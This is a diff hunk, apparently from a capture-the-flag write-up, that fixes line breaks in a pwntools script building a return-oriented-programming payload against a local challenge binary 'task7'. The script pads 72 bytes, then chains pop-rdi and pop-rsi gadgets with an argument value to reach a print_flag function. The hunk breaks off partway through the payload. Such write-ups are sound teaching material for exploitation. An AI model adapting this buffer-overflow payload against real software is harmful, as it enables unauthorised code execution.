@@ -31,7 +31,8 @@ using ropper, we can find the wanted gadgets :
 from pwn import *                                                                                                                                                                                                                               p = process("./task7")                                                                                                  
 poprdi = 0x401323                                                                                                       
 poprsi = 0x401321                                                                                                       
-print_flag = 0x40121f                                                                                                                                                                                                                           payload = b""                                                                                                           
+print_flag = 0x40121f                                                                                                   
+payload = b""                                                                                                           
 payload += b"A"*72                                                                                                      
 payload += p64(poprdi)                                                                                                  
 payload += p64(0xdeadbeef)                                                                                              
